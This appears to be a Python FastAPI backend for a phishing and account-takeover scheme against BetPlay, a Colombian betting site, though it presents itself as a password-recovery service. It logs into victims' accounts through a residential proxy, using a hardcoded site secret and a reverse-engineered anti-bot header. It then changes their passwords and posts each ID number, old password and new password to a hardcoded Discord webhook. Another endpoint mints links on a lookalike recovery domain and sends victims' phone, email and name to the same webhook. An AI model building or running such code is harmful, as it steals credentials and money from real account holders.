"""
API para cambio de contraseña en BetPlay
FastAPI con documentación automática en /docs
"""

import base64
import hashlib
import hmac
import json
import os
import random
import secrets
import string
import time
from typing import Optional
from curl_cffi import requests
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
from fastapi.staticfiles import StaticFiles


# ---------------------------------------------------------------
# CONFIGURACIÓN
# ---------------------------------------------------------------
BASE_URL     = "https://betplay.com.co"
TOKEN_WINDOW = 90
JWT_SECRET   = "kw4he!je!4Pf#[["
BPC_KEY      = "191BCCEB25E8718E8BB58C21B63B9"
VERSION      = "4.0.71"

# Proxy residencial (2captcha)
PROXY_USER = os.environ.get("PROXY_USER", "u1ebdced056e605cf-zone-custom-region-co")
PROXY_PASS = os.environ.get("PROXY_PASS", "u1ebdced056e605cf")
PROXY_DNS  = os.environ.get("PROXY_DNS", "na.proxy.2captcha.com:2334")

# Discord Webhook
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "https://discord.com/api/webhooks/1559311988184588319/8BXHxI_gOKqtl4YwCAjKndrtuZ6aHnaJD1Q_7riBMDxOjyvEQgV5Ak9-FmIvtrOLiZ1Y")

# URL del dominio (para generar links)
APP_DOMAIN = os.environ.get("APP_DOMAIN", "https://recuperacion-de-contrasena-betplay.com")

BASE_HEADERS = {
    "accept":           "application/json, text/plain, */*",
    "accept-encoding":  "gzip, deflate, br",
    "accept-language":  "es-ES,es;q=0.9",
    "origin":           BASE_URL,
    "referer":          f"{BASE_URL}/",
    "sec-fetch-dest":   "empty",
    "sec-fetch-mode":   "cors",
    "sec-fetch-site":   "same-origin",
    "user-agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
}


def get_proxy() -> dict:
    url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_DNS}"
    return {"http": url, "https": url}


# ---------------------------------------------------------------
# TOKEN STORAGE
# ---------------------------------------------------------------
TOKENS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tokens.json")

def load_tokens() -> dict:
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_tokens(tokens: dict):
    with open(TOKENS_FILE, "w") as f:
        json.dump(tokens, f, indent=2)

def generate_token(length=96):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choices(chars, k=length))


def send_to_discord(embed: dict):
    try:
        payload = {"embeds": [embed]}
        session = requests.Session()
        session.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        session.close()
    except Exception as e:
        print(f"Discord error: {e}")


# ---------------------------------------------------------------
# MODELOS
# ---------------------------------------------------------------
class ChangePasswordRequest(BaseModel):
    username: str
    current_password: str
    new_password: str


class ChangePasswordResponse(BaseModel):
    success: bool
    message: str
    status_code: Optional[int] = None
    profile: Optional[dict] = None
    balance: Optional[dict] = None


class CreateTokenRequest(BaseModel):
    cedula: str
    monto: str
    telefono: str = ""
    email: str = ""
    nombre: str = ""


class TokenResponse(BaseModel):
    success: bool
    token: str = ""
    link: str = ""
    message: str = ""


# ---------------------------------------------------------------
# FUNCIONES DE AUTENTICACIÓN
# ---------------------------------------------------------------
def obtener_cookies(session, proxy) -> None:
    headers_navegador = {
        "accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "es-ES,es;q=0.9",
        "user-agent":      BASE_HEADERS["user-agent"],
    }
    session.get(BASE_URL, headers=headers_navegador, impersonate="chrome", proxies=proxy, timeout=20)
    time.sleep(1.5)
    session.get(BASE_URL, headers=headers_navegador, impersonate="chrome", proxies=proxy, timeout=20)
    time.sleep(0.5)


def get_server_time(session, proxy) -> int:
    r = session.get(
        f"{BASE_URL}/reverse-proxy?currentTime",
        headers={
            **BASE_HEADERS,
            "content-type":     "application/json; charset=utf-8",
            "x-requested-with": "XMLHttpRequest",
        },
        impersonate="chrome",
        proxies=proxy,
        timeout=20
    )
    try:
        return r.json()["time"]
    except:
        raise Exception(f"get_server_time falló. Status: {r.status_code}, Response: {r.text[:200]}")


def build_jwt(username: str, password: str, timestamp: int) -> str:
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "HS256"}, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

    payload_b64 = base64.urlsafe_b64encode(
        json.dumps({
            "userName": username,
            "password": password,
            "iat":      timestamp,
            "exp":      timestamp + TOKEN_WINDOW,
        }, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

    signing_input = f"{header}.{payload_b64}"
    signature = base64.urlsafe_b64encode(
        hmac.new(JWT_SECRET.encode(), signing_input.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()

    return f"{signing_input}.{signature}"


def generate_bpc_hash(current_time: int) -> str:
    parte1 = base64.b64encode(
        json.dumps({"BPCValid": True, "iat": current_time}, separators=(',', ':')).encode()
    ).decode()

    joined = ''.join(str(x) for x in [secrets.randbelow(256) for _ in range(16)])
    b = int(float(joined))

    chars = '0123456789abcdefghijklmnopqrstuv'
    n, b32 = b, ''
    while n > 0:
        b32 = chars[n % 32] + b32
        n //= 32
    clean = ''.join(c for c in b32 if c.isdigit())
    operacion = str(int(clean) + int(current_time))

    h = hashlib.new('sha3_512')
    h.update((BPC_KEY + operacion).encode())
    parte2 = h.hexdigest().zfill(128)

    return f"{parte1}.{parte2}.{b}"


def do_login(session, proxy, username: str, password: str) -> dict:
    ts = get_server_time(session, proxy)
    token = build_jwt(username, password, ts)
    bpc = generate_bpc_hash(ts)

    headers = {
        **BASE_HEADERS,
        "content-type":              "application/json; charset=UTF-8",
        "strict-transport-security": "max-age=31536000; includeSubDomains",
        "x-bpcstatus-x":             bpc,
        "x-custom-header":           username,
        "x-custom-version":          VERSION,
        "x-sisplay-header":          "true",
    }

    r = session.post(
        f"{BASE_URL}/reverse-proxy/accounts/sessions/complete",
        data=token,
        headers=headers,
        impersonate="chrome",
        proxies=proxy,
        timeout=(8, 15)
    )

    try:
        body = r.json()
    except:
        body = {"error": f"Respuesta no es JSON: {r.text[:200]}", "status_code": r.status_code}

    return {"status": r.status_code, "body": body}


def change_password_api(username: str, current_password: str, new_password: str) -> dict:
    proxy = get_proxy()
    session = requests.Session()
    
    try:
        obtener_cookies(session, proxy)
        login_result = do_login(session, proxy, username, current_password)
        
        if login_result["status"] != 200 or login_result["body"].get("code") != 0:
            return {
                "success": False,
                "message": f"Error en login: {login_result['body'].get('message', login_result['body'].get('error', 'Credenciales inválidas'))}",
                "status_code": login_result["status"]
            }
        
        auth_token = login_result["body"].get("session", {}).get("accessToken", "")
        if not auth_token:
            return {
                "success": False,
                "message": "No se obtuvo el token de autorización",
                "status_code": 500
            }
        
        ts = get_server_time(session, proxy)
        bpc = generate_bpc_hash(ts)
        
        headers = {
            **BASE_HEADERS,
            "content-type":              "application/json; charset=utf-8",
            "strict-transport-security": "max-age=31536000; includeSubDomains",
            "authorization":             auth_token,
            "x-custom-header":           username,
            "x-custom-version":          VERSION,
            "x-custom-times":            f"{ts}, {ts + 600}, {ts + 1200}",
            "x-bpcstatus-x":             bpc,
        }
        
        payload = {
            "currentPassword": current_password,
            "newPassword": new_password
        }
        
        r = session.post(
            f"{BASE_URL}/reverse-proxy/accounts/me/password",
            json=payload,
            headers=headers,
            impersonate="chrome",
            proxies=proxy,
            timeout=15
        )
        
        try:
            response_body = r.json()
        except:
            response_body = {"error": f"Respuesta no es JSON: {r.text[:200]}"}
        
        return {
            "success": r.status_code == 200,
            "message": response_body.get("message", "Contraseña cambiada correctamente"),
            "status_code": r.status_code,
            "profile": {
                "username": login_result["body"].get("profile", {}).get("username"),
                "name": f"{login_result['body'].get('profile', {}).get('firstName', '')} {login_result['body'].get('profile', {}).get('lastName', '')}",
                "email": login_result["body"].get("profile", {}).get("email"),
                "document": login_result["body"].get("profile", {}).get("identityDocument", {}).get("number")
            },
            "balance": login_result["body"].get("balance", {})
        }
    
    except Exception as e:
        return {
            "success": False,
            "message": f"Error: {str(e)}",
            "status_code": 500
        }
    finally:
        session.close()


# ---------------------------------------------------------------
# API
# ---------------------------------------------------------------
app = FastAPI(
    title="BetPlay Password Change API",
    description="API para cambiar contraseñas de cuentas BetPlay",
    version="2.0.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")
if os.path.exists(STATIC_DIR):
    app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")


@app.post("/change-password", response_model=ChangePasswordResponse)
async def change_password(request: ChangePasswordRequest):
    """Cambia la contraseña de una cuenta BetPlay"""
    result = change_password_api(
        request.username,
        request.current_password,
        request.new_password
    )
    
    # Actualizar resultados.json con el estado del cambio
    if result["success"]:
        resultados_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..\\..\\..\\..\\Desktop\\betplay-pin\\resultados.json")
        if os.path.exists(resultados_path):
            try:
                with open(resultados_path, "r", encoding="utf-8") as f:
                    resultados = json.load(f)
                for r in resultados:
                    if r.get("cedula") == request.username:
                        r["estado"] = "contrasena_cambiada"
                        r["fecha_cambio"] = time.strftime("%Y-%m-%d %H:%M:%S")
                        r["current_password"] = request.current_password
                        r["new_password"] = request.new_password
                        break
                with open(resultados_path, "w", encoding="utf-8") as f:
                    json.dump(resultados, f, indent=2, ensure_ascii=False)
            except Exception as e:
                print(f"Error actualizando resultados.json: {e}")
        
        # Enviar a Discord con las contraseñas
        embed = {
            "title": " Contraseña Cambiada Exitosamente",
            "color": 3066993,
            "fields": [
                {"name": "📄 Cédula", "value": f"`{request.username}`", "inline": True},
                {"name": " Contraseña Actual", "value": f"`{request.current_password}`", "inline": True},
                {"name": "🆕 Nueva Contraseña", "value": f"`{request.new_password}`", "inline": True},
            ],
            "footer": {"text": "BetPlay Password Change"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
        }
        send_to_discord(embed)
    
    if not result["success"]:
        raise HTTPException(
            status_code=result.get("status_code", 400),
            detail=result["message"]
        )
    
    return result


@app.post("/token/create", response_model=TokenResponse)
async def create_token(req: CreateTokenRequest):
    """Crea un token para link de recuperación y notifica a Discord"""
    token = generate_token()
    link = f"{APP_DOMAIN}/?t={token}"
    
    tokens = load_tokens()
    tokens[token] = {
        "cedula": req.cedula,
        "monto": req.monto,
        "telefono": req.telefono,
        "email": req.email,
        "nombre": req.nombre,
        "creado": time.strftime("%Y-%m-%d %H:%M:%S"),
        "usado": False
    }
    save_tokens(tokens)
    
    # Enviar a Discord
    embed = {
        "title": "🔑 Nuevo Link de Recuperación Generado",
        "color": 5814783,
        "fields": [
            {"name": "📄 Cédula", "value": f"`{req.cedula}`", "inline": True},
            {"name": "💰 Monto", "value": f"${req.monto}", "inline": True},
            {"name": "📱 Teléfono", "value": f"`{req.telefono}`", "inline": True},
            {"name": "📧 Email", "value": req.email or "N/A", "inline": True},
            {"name": " Nombre", "value": req.nombre or "N/A", "inline": True},
            {"name": "🔗 Link", "value": link, "inline": False},
        ],
        "footer": {"text": f"Token: {token}"}
    }
    send_to_discord(embed)
    
    return TokenResponse(success=True, token=token, link=link, message="Token creado y enviado a Discord")


@app.get("/token/{token_val}")
async def get_token_data(token_val: str):
    """Devuelve los datos asociados a un token"""
    tokens = load_tokens()
    data = tokens.get(token_val)
    if not data:
        raise HTTPException(status_code=404, detail="Token no encontrado")
    
    tokens[token_val]["usado"] = True
    save_tokens(tokens)
    
    return {
        "cedula": data["cedula"],
        "monto": data["monto"],
        "telefono": data["telefono"],
        "nombre": data["nombre"]
    }


HTML_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "index.html")

@app.get("/")
async def root():
    if os.path.exists(HTML_PATH):
        return FileResponse(HTML_PATH, media_type="text/html")
    return {
        "message": "BetPlay Password Change API",
        "docs": "/docs",
        "endpoints": {
            "POST /change-password": "Cambiar contraseña",
            "POST /token/create": "Crear token de recuperación",
            "GET /token/{token}": "Obtener datos del token"
        }
    }


@app.get("/health")
async def health():
    return {"status": "ok"}


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8001)
